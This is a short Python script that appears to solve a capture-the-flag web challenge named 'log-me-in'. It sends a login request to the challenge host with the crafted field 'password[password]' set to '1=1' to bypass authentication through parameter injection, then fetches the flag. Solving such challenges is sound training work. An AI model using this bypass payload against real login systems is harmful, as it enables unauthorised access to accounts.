import requests

url = "https://log-me-in.web.ctfcompetition.com/"

s = requests.Session();

r = s.post(url + 'login', data = {
	"username": "michelle",
	"password[password]": "1=1"
})
	
r = s.get(url + 'flag')
print(r.text);

s.close();